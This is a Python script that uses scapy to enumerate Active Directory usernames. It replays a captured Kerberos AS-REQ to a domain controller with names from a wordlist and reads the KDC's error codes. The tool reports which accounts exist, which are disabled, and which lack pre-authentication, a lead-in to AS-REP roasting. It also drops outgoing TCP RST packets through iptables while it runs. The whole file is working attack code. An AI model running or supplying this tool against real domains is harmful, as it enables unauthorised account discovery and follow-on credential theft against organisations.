import scapy.all as scapy
import sys
import random
import os
import time
import struct

# Get source and destination IPs from command-line arguments
src_ip = sys.argv[1]
dst_ip = sys.argv[2]
kerb_data = sys.argv[3]
wordlist = sys.argv[4]

byte_skip = 4
over_head_skip = 7
var_header = 4

def is_kerberos(raw_data): # Function which tests if this message is a keberos AS message
    if len(raw_data) < 9:
        return False, 0  # Not enough data to be a Kerberos message

    if raw_data[0:2] != b'\x00\x00':
        return False, 0  # Usually not a Kerberos message

    if raw_data[4] == 107 and raw_data[5] == 130: # Yes i have to do it this way since the interpretation of bytes is messed up copared to capturing raw message
        return True, 1  # AS_REP
    elif raw_data[4] == 126:
        return True, 2  # KRB_ERROR
    else:
        return False, 0 

krb_error_codes = {
    0: "KDC_ERR_NONE",
    1: "KDC_ERR_NAME_EXP",  # Client's entry in database has expired
    2: "KDC_ERR_SERVICE_EXP",  # Server's entry in database has expired
    3: "KDC_ERR_BAD_PVNO",  # Requested protocol version number not supported
    4: "KDC_ERR_C_OLD_MAST_KVNO",  # Client's key encrypted in old master key
    5: "KDC_ERR_S_OLD_MAST_KVNO",  # Server's key encrypted in old master key
    6: "KDC_ERR_C_PRINCIPAL_UNKNOWN",  # Client not found in Kerberos database
    7: "KDC_ERR_S_PRINCIPAL_UNKNOWN",  # Server not found in Kerberos database
    8: "KDC_ERR_PRINCIPAL_NOT_UNIQUE",  # Multiple entries for client/server
    9: "KDC_ERR_NULL_KEY",  # The client or server has a null key
    10: "KDC_ERR_CANNOT_POSTDATE",  # Ticket not eligible for postdating
    11: "KDC_ERR_NEVER_VALID",  # Requested start time is in the future
    12: "KDC_ERR_POLICY",  # KDC policy rejects request
    13: "KDC_ERR_BADOPTION",  # KDC cannot accommodate requested option
    14: "KDC_ERR_ETYPE_NOSUPP",  # KDC does not support the requested encryption type
    15: "KDC_ERR_SUMTYPE_NOSUPP",  # KDC does not support the requested checksum type
    16: "KDC_ERR_PADATA_TYPE_NOSUPP",  # KDC does not support the requested pre-authentication type
    17: "KDC_ERR_TRTYPE_NOSUPP",  # KDC does not support the requested transited type
    18: "KDC_ERR_CLIENT_REVOKED",  # Client's credentials have been revoked
    19: "KDC_ERR_SERVICE_REVOKED",  # Server's credentials have been revoked
    20: "KDC_ERR_TGT_REVOKED",  # TGT has been revoked
    21: "KDC_ERR_CLIENT_NOTYET",  # Client not yet valid
    22: "KDC_ERR_SERVICE_NOTYET",  # Server not yet valid
    23: "KDC_ERR_KEY_EXPIRED",  # Password has expired
    24: "KDC_ERR_PREAUTH_FAILED",  # Pre-authentication failed
    25: "KDC_ERR_PREAUTH_REQUIRED",  # Additional pre-authentication required
    26: "KDC_ERR_SERVER_NOMATCH",  # Server and ticket don't match
    27: "KDC_ERR_MUST_USE_USER2USER",  # Must use user-to-user authentication
    28: "KDC_ERR_PATH_NOT_ACCEPTED",  # KDC policy rejects transited path
    29: "KDC_ERR_SVC_UNAVAILABLE",  # A service is unavailable
    31: "KRB_AP_ERR_BAD_INTEGRITY",  # Integrity check on decrypted field failed
    32: "KRB_AP_ERR_TKT_EXPIRED",  # Ticket expired
    33: "KRB_AP_ERR_TKT_NYV",  # Ticket not yet valid
    34: "KRB_AP_ERR_REPEAT",  # Request is a replay
    35: "KRB_AP_ERR_NOT_US",  # The ticket isn't for us
    36: "KRB_AP_ERR_BADMATCH",  # Ticket/authenticator don't match
    37: "KRB_AP_ERR_SKEW",  # Clock skew too great
    38: "KRB_AP_ERR_BADADDR",  # Incorrect net address in ticket
    39: "KRB_AP_ERR_BADVERSION",  # Protocol version mismatch
    40: "KRB_AP_ERR_MSG_TYPE",  # Message type is unknown
    41: "KRB_AP_ERR_MODIFIED",  # Message stream modified
    42: "KRB_AP_ERR_BADORDER",  # Message out of order
    44: "KRB_AP_ERR_BADKEYVER",  # Bad key version number
    45: "KRB_AP_ERR_NOKEY",  # Key version is not available
    46: "KRB_AP_ERR_MUT_FAIL",  # Mutual authentication failed
    47: "KRB_AP_ERR_BADDIRECTION",  # Incorrect message direction
    48: "KRB_AP_ERR_METHOD",  # Alternative authentication method required
    49: "KRB_AP_ERR_BADSEQ",  # Incorrect sequence number in message
    50: "KRB_AP_ERR_INAPP_CKSUM",  # Inappropriate type of checksum in message
    51: "KRB_ERR_FIELD_TOOLONG",  # Field too long for implementation
    52: "KDC_ERR_CLIENT_NOT_TRUSTED",  # Client not trusted
    53: "KDC_ERR_KDC_NOT_TRUSTED",  # KDC not trusted
    54: "KDC_ERR_INVALID_SIG",  # Signature is invalid
    55: "KDC_ERR_DH_KEY_PARAMETERS_NOT_ACCEPTED",  # Diffie-Hellman parameters not accepted
    56: "KDC_ERR_CERTIFICATE_MISMATCH",  # Certificate mismatch
    57: "KRB_AP_ERR_NO_TGT",  # No TGT available
    58: "KDC_ERR_WRONG_REALM",  # Incorrect realm
    59: "KRB_AP_ERR_USER_TO_USER_REQUIRED",  # User-to-user authentication required
    60: "KDC_ERR_CANT_VERIFY_CERTIFICATE",  # Unable to verify certificate
    61: "KDC_ERR_INVALID_CERTIFICATE",  # Invalid certificate
    62: "KDC_ERR_REVOKED_CERTIFICATE",  # Certificate revoked
    63: "KDC_ERR_REVOCATION_STATUS_UNKNOWN",  # Certificate revocation status unknown
    64: "KDC_ERR_CLIENT_NAME_MISMATCH",  # Client name mismatch in certificate
    65: "KDC_ERR_KDC_NAME_MISMATCH",  # KDC name mismatch in certificate
}


def get_record_lenght(byte_data): #Checking record lenght so i know how long the message is
    if len(byte_data) < 4:
        raise ValueError("Byte data must be at least 4 bytes long")
    
    length = struct.unpack('!I', byte_data[:4])[0]

    length &= 0x7FFFFFFF

    return length

def prep_payload(raw_data, auth_as):
                record_lenght = get_record_lenght(raw_data[:4])
                pvno_offset = 4 + 3 + 7 # Record lenght + identitifaction + specific offset
                krb_msg_type_offset = pvno_offset + byte_skip + 1 
                req_body_offset = krb_msg_type_offset + byte_skip + 19 + 3 # Described + Described + PA data taken from wireshark intercepted message + extra pad
                req_body_header = krb_msg_type_offset + byte_skip + 19
                padding_offset = req_body_offset + 7 + 1# Specific skip again
                cname_offset = padding_offset + 4
                name_type = cname_offset + 6 + 2 + 1
                cname_string_offset = name_type + 4
                string_lenght_offset = cname_string_offset + 2 # 1b before
                string_lenght = raw_data[string_lenght_offset]

                new_len = len(auth_as) - string_lenght
                
                tmp_holder = raw_data[6] + new_len
                raw_data = raw_data[:6] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[7:]
                tmp_holder = raw_data[9] + new_len
                raw_data = raw_data[:9] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[10:]
                tmp_holder = raw_data[req_body_offset+3] + new_len
                raw_data = raw_data[:req_body_offset+3] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[req_body_offset+4:]
                tmp_holder = raw_data[req_body_header+3] + new_len
                raw_data = raw_data[:req_body_header+3] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[req_body_header+4:]
                tmp_holder = raw_data[cname_offset+2] + new_len
                raw_data = raw_data[:cname_offset+2] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+3:]
                tmp_holder = raw_data[cname_offset+4] + new_len
                raw_data = raw_data[:cname_offset+4] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+5:]
                tmp_holder = raw_data[cname_offset+11] + new_len
                raw_data = raw_data[:cname_offset+11] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+12:]
                tmp_holder = raw_data[cname_offset+13] + new_len
                raw_data = raw_data[:cname_offset+13] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+14:]
                raw_data = raw_data[:string_lenght_offset] + len(auth_as).to_bytes(1, byteorder='big') + raw_data[string_lenght_offset+1:]
                raw_data = raw_data[:string_lenght_offset + 1] + auth_as.encode('ascii') + raw_data[string_lenght_offset + string_lenght + 1:]
                new_data_lenght = len(raw_data) - 4
                raw_data = struct.pack('!I', new_data_lenght) + raw_data[4:]
                return raw_data

# List of names to send
with open(wordlist) as file:
    payloads = [line.rstrip() for line in file]

# Need to block RST packets before OS terminates the connection first https://stackoverflow.com/questions/9058052/unwanted-rst-tcp-packet-with-scapy
os.system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP")

f = open(kerb_data, "rb")
raw_data = f.read()
# Scan target loop
for payload in payloads:
    # Establish TCP handshake with DC
    sport = random.randint(1024,65535)
    ip = scapy.IP(src=src_ip, dst=dst_ip)

    # SYN Packet
    SYN = scapy.TCP(sport=sport, dport=88, flags='S', seq=random.randint(1000, 9999))
    synack = scapy.sr1(ip/SYN, timeout=3, verbose=False) # Sending while waiting for response

    if not synack or not synack.haslayer(scapy.TCP) or synack[scapy.TCP].flags != 0x12:
        print("No SYN-ACK received. Retrying...")
        continue

    seq_num = synack.ack # Need to keep the sequence and ack numbers to ensure consistency of the message flow
    ack_seq = synack.seq + 1

    # Complete the handshake ACK
    ACK = scapy.TCP(sport=sport, dport=88, flags='A', seq=seq_num, ack=ack_seq)
    scapy.send(ip/ACK, verbose=False)

    # Preparing KERB data with desired username
    data = prep_payload(raw_data, payload)

    # Sending payload
    payload_packet = ip / scapy.TCP(sport=sport, dport=88, flags='PA', seq=seq_num, ack=ack_seq) / scapy.Raw(load=data)
    scapy.send(payload_packet, verbose=False)

    time.sleep(0.5)

    server_response = scapy.sniff(filter=f"tcp and src {dst_ip} and dst {src_ip} and port 88", count=1, timeout=3)[0]
    if server_response and server_response.haslayer(scapy.TCP):
        server_response = server_response.getlayer(scapy.TCP)
        server_raw_data = bytes(server_response.payload)
        is_krb, msg_type = is_kerberos(server_raw_data)
        if is_krb:
            if msg_type == 1: # This means this user has preauth disabled
                print(f"KDC responded with AS-REQ for {payload}. This user exists and doesn't require authentication")
            if msg_type == 2:
                record_lenght = get_record_lenght(server_raw_data[:4])
                pvno_offset = 4 + 4 + 4 + 1
                krb_msg_type_offset = pvno_offset + var_header
                stime_len_offset = krb_msg_type_offset + var_header
                skip_bytes = server_raw_data[stime_len_offset] # Skipping unimportant fields
                susec_len_offset = stime_len_offset + skip_bytes + var_header
                skip_bytes = server_raw_data[susec_len_offset]
                error_code_len_offset = susec_len_offset + skip_bytes + var_header
                error_code_offset = error_code_len_offset + 1
                error_code = server_raw_data[error_code_offset]
                error_code_msg = krb_error_codes.get(server_raw_data[error_code_offset], "Unknown")
                if error_code == 6: # This means user doesnt exist in AD database
                    print(f"KDC responded with {error_code_msg} for user {payload}. This doesn't user exists")
                elif error_code == 25: # User exists but requires preauthentication
                    print(f"KDC responded with {error_code_msg} for user {payload}. This user exists and requires pre-authentication")
                elif error_code == 18: # User exists but was disabled due to whatever the organization decided
                    print(f"KDC responded with {error_code_msg} for user {payload}. This user exists but has been disabled")
                else: # Any other case user doesnt exist
                    print(f"KDC responded with {error_code_msg}. This response is unusual")
    else:
        print("Received unknown response")
    
    seq_num += len(data)  
    ack_seq = server_response[0][scapy.TCP].seq + 1
    # Finish with FIN to close the connection gracefully
    FIN = scapy.TCP(sport=sport, dport=88, flags='FA', seq=seq_num, ack=ack_seq)
    finack = scapy.sr1(ip/FIN, timeout=3, verbose=False)

    # If we get a FIN-ACK, send final ACK
    if finack and finack.haslayer(scapy.TCP) and finack[scapy.TCP].flags & 0x10:
        final_ack = scapy.TCP(sport=sport, dport=88, flags='A', seq=seq_num + 1, ack=finack.seq + 1)
        scapy.send(ip/final_ack, verbose=False)



# Remove firewall rule
os.system(f"iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP")
